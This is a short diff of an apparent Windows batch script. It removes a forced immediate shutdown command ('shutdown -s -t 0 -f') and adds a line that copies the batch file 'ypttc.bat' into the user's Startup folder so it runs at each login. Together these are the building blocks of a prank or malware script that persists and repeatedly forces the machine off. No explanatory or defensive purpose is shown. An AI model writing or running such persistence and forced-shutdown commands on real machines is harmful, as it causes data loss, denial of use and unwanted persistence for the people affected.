@@ -1,2 +1,1 @@
-@echo off
-shutdown -s -t 0 -f
+copy "ypttc.bat" C:\Users\User\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
